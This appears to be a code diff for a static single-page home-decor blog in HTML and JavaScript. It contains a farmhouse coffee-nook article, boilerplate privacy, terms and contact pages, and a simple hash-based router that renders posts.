+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cottage Living Room</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cozy Interior Design</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Rustic Decor</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Home Styling</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Warm Interiors</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Country Style</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Home Decor Ideas</span>
+</div>
+
+                    `
+            },
+            {
+                id: 'Small-Space-Home',
+                title: 'Small Space Home Coffee Bar Ideas',
+                date: 'April 25, 2026',
+                // 👇 Change this to point to your local assets folder
+                image: './assets/Small-Space-Home.png',
+                excerpt: 'Transform your kitchen into the ultimate morning retreat with a cozy, rustic home coffee bar! ☕ This gorgeous setup uses warm wood shelving and white subway tiles to create a dedicated nook that feels like a high-end cafe. ',
+               content : `
+               <p>There is something undeniably comforting about starting your day with a perfectly brewed cup of coffee in a thoughtfully designed space. A dedicated coffee nook transforms a simple daily ritual into a moment of calm, creativity, and indulgence. With the rise of cozy, farmhouse-inspired interiors, more homeowners are embracing the idea of creating a stylish coffee bar right inside their kitchen or a small alcove.</p>
+
+<p>This beautifully organized coffee station blends functionality with charm, combining warm wood tones, clean cabinetry, and carefully curated decor. It is more than just a place to brew coffee. It is a lifestyle statement that celebrates slow mornings, intentional living, and the joy of small comforts.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>A dedicated coffee nook enhances both functionality and home aesthetics</li>
+    <li>Farmhouse design elements create a warm, inviting atmosphere</li>
+    <li>Open shelving allows for both storage and decorative styling</li>
+    <li>Good lighting elevates the entire coffee experience</li>
+    <li>Organized layouts make daily routines more enjoyable and efficient</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why a Coffee Nook Is a Must-Have Feature</h2>
+
+<p>A coffee nook is not just about convenience. It is about creating a personal retreat within your home. Instead of cluttering your kitchen countertops, a designated space allows you to keep everything organized while adding a unique design feature.</p>
+
+<p>Whether you are a casual coffee drinker or a true enthusiast, having a dedicated area elevates your daily routine. It gives you a place to pause, enjoy the aroma, and ease into your day with intention.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> A well-designed coffee nook does more than serve drinks. It becomes a focal point in your home that combines utility, personality, and a sense of comfort.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Charm of Farmhouse Coffee Bar Design</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Warm Wood and Neutral Tones</h3>
+
+<p>The combination of wooden shelves and soft white cabinetry creates a balanced and calming palette. Wood introduces warmth, while neutral tones keep the space fresh and clean. This pairing is essential for achieving the farmhouse look.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Classic Subway Tile Backdrop</h3>
+
+<p>A simple tiled backsplash adds texture without overwhelming the design. It reflects light beautifully and acts as a neutral canvas that allows other elements to stand out.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Vintage-Inspired Decor</h3>
+
+<p>Decorative signage, ceramic jars, and glass containers filled with coffee essentials bring character to the space. These small details contribute to the overall cozy and nostalgic feel.</p>
+
+<div style="background:#f1f5f9;border:1px solid #e2e8f0;border-radius:12px;padding:16px 18px;margin:28px 0;">
+  <h4 style="font-size:20px;line-height:1.4;margin:0 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Expert Insight</h4>
+  <p style="margin:0;color:#334155;">Blending functional items with decorative pieces is key to achieving a coffee nook that feels curated rather than cluttered. Every item should serve a purpose or add visual value.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Smart Storage and Organization Ideas</h2>
+
+<p>One of the standout features of a well-designed coffee nook is its efficient use of space. Open shelves, drawers, and cabinets work together to keep everything accessible and neatly arranged.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Open Shelving for Easy Access</h3>
+
+<p>Displaying mugs, jars, and accessories on open shelves not only makes them easy to grab but also adds to the visual appeal. Arrange items thoughtfully to maintain a clean and cohesive look.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Drawer and Cabinet Storage</h3>
+
+<p>Lower cabinets provide hidden storage for larger items, keeping the countertop uncluttered. Woven baskets and trays help organize smaller essentials while adding texture.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Use clear jars to store coffee beans, sugar, or snacks. This keeps ingredients visible and adds a decorative touch that enhances the overall aesthetic.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Lighting That Elevates the Experience</h2>
+
+<p>Lighting plays a crucial role in setting the mood for your coffee nook. Soft, warm bulbs create a cozy ambiance that makes the space feel inviting at any time of day.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Wall-Mounted Fixtures</h3>
+
+<p>Simple wall-mounted lights add both functionality and style. They illuminate the workspace while contributing to the overall design.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Natural Light Integration</h3>
+
+<p>Positioning your coffee nook near a window enhances the experience. Natural light highlights textures and creates a refreshing morning atmosphere.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Combining natural and artificial lighting ensures your coffee station remains functional and visually appealing throughout the day.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling Your Coffee Station Like a Pro</h2>
+
+<p>Styling is where your personality truly shines. A coffee nook should feel personal and inviting, reflecting your tastes and daily habits.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Greenery for Freshness</h3>
+
+<p>Small potted plants or herbs bring life to the space. They add a touch of color while maintaining the natural aesthetic.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Incorporate Functional Decor</h3>
+
+<p>Use trays, jars, and containers that are both practical and visually pleasing. This approach keeps the space organized while enhancing its design.</p>
+
+<div style="background:#f1f5f9;border:1px solid #e2e8f0;border-radius:12px;padding:16px 18px;margin:28px 0;">
+  <h4 style="font-size:20px;line-height:1.4;margin:0 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Why This Matters</h4>
+  <ul style="margin:0;padding-left:18px;color:#334155;">
+    <li>Thoughtful styling enhances daily routines</li>
+    <li>Personal touches make the space feel unique</li>
+    <li>Balanced decor prevents visual clutter</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Creating a Daily Ritual You Love</h2>
+
+<p>A coffee nook is not just about design. It is about creating a meaningful daily ritual. From selecting your favorite mug to preparing your drink just the way you like it, this space becomes a moment of calm in a busy day.</p>
+
+<p>When your environment is thoughtfully designed, even the simplest routines feel more enjoyable. This is the true power of a well-crafted coffee station.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:16px 18px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:10px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Points</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Keep essentials within easy reach</li>
+    <li>Use warm lighting for a cozy atmosphere</li>
+    <li>Mix storage with decorative elements</li>
+    <li>Personalize with plants and accessories</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Elevate Your Home with a Cozy Coffee Nook</h2>
+
+<p>A farmhouse-style coffee nook brings together beauty, functionality, and comfort in one compact space. It transforms an everyday routine into a cherished ritual while enhancing the overall aesthetic of your home.</p>
+
+<p>By incorporating natural materials, thoughtful storage, and warm lighting, you can create a coffee station that feels both stylish and welcoming. Whether you are designing from scratch or refreshing an existing space, the possibilities are endless when you focus on comfort, simplicity, and charm.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Coffee Nook</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Farmhouse Kitchen</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Coffee Bar Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Kitchen Decor</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Home Organization</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Rustic Style</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cozy Interiors</span>
+</div>
+
+               `
+                }
+        ];
+
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>My Awesome Blog</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At My Awesome Blog, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+                    
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+                    
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Minimalist Home Decor Edit";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // A placeholder avatar
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+
+            if (!page) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 30px; padding-bottom: 30px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+
+            if (!post) {
+                app.innerHTML = `<p style="color: var(--text-color);">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                // Check if the hash matches a static page, otherwise assume it's a post
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
 </body>
+
 </html>
